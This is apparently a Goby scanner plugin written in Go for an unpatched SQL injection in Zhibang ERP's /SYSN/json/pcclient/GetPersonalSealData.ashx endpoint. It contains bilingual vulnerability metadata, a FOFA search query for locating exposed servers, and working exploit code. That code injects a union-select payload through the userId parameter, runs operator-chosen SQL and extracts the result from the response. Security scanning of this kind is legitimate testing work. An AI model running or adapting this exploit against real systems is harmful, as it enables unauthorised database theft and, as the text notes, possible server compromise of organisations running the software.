package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx SQL Injection Vulnerability",
    "Description": "<p>Zhibang-ENT-MGMT is a comprehensive enterprise resource planning system designed to help enterprises automate and optimize business processes. The system includes a series of functional modules, such as financial management, procurement management, sales management, inventory management, production management, etc., which can meet the needs of enterprises in all aspects.</p><p>Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx has an SQL injection vulnerability. In addition to using the SQL injection vulnerability, the attacker can obtain the information in the database (for example, after the administrator In addition to the password and the user's personal information of the site), even in the case of high permissions, Trojans can be written to the server to further obtain the permissions of the server system.</p>",
    "Product": "Zhibang-ENT-MGMT",
    "Homepage": "http://www.zbintel.com/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-19",
    "Author": "Town",
    "FofaQuery": "body=\"sysn/view/init/default.ashx\" && body=\"SYSA/images/zbintelsng.png\"",
    "GobyQuery": "body=\"sysn/view/init/default.ashx\" && body=\"SYSA/images/zbintelsng.png\"",
    "Level": "2",
    "Impact": "<p>Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx has an SQL injection vulnerability. In addition to using the SQL injection vulnerability, the attacker can obtain the information in the database (for example, after the administrator In addition to the password and the user's personal information of the site), even in the case of high permissions, Trojans can be written to the server to further obtain the permissions of the server system.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zbintel.com/\">http://www.zbintel.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "select",
            "value": "@@VERSION,DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "智邦国际ERP /SYSN/json/pcclient/GetPersonalSealData.ashx SQL 注入漏洞",
            "Product": "智邦国际-企业管理软件",
            "Description": "<p>智邦国际ERP系统是一款综合性的企业资源计划系统，旨在帮助企业实现业务流程的自动化和优化。该系统包括了一系列的功能模块，如财务管理、采购管理、销售管理、库存管理、生产管理等，可以满足企业各方面的需求。<br></p><p>智邦国际ERP系统&nbsp;/SYSN/json/pcclient/GetPersonalSealData.ashx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.zbintel.com/\">http://www.zbintel.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>智邦国际ERP系统 /SYSN/json/pcclient/GetPersonalSealData.ashx 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx SQL Injection Vulnerability",
            "Product": "Zhibang-ENT-MGMT",
            "Description": "<p>Zhibang-ENT-MGMT is a comprehensive enterprise resource planning system designed to help enterprises automate and optimize business processes. The system includes a series of functional modules, such as financial management, procurement management, sales management, inventory management, production management, etc., which can meet the needs of enterprises in all aspects.</p><p>Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx has an SQL injection vulnerability. In addition to using the SQL injection vulnerability, the attacker can obtain the information in the database (for example, after the administrator In addition to the password and the user's personal information of the site), even in the case of high permissions, Trojans can be written to the server to further obtain the permissions of the server system.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zbintel.com/\">http://www.zbintel.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Zhibang-ENT-MGMT /SYSN/json/pcclient/GetPersonalSealData.ashx has an SQL injection vulnerability. In addition to using the SQL injection vulnerability, the attacker can obtain the information in the database (for example, after the administrator In addition to the password and the user's personal information of the site), even in the case of high permissions, Trojans can be written to the server to further obtain the permissions of the server system.<br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`

	sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20" + sql + "--")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "\"SealData\":\"") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `@@version`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/SYSN/json/pcclient/GetPersonalSealData.ashx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_m8tisPmB7F7qeBHMPg82p07hJk5hcRbw
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `"SealData":"([^"]*)"`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, "@@VERSION")
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo
			}
			return expResult
		},
	))
}
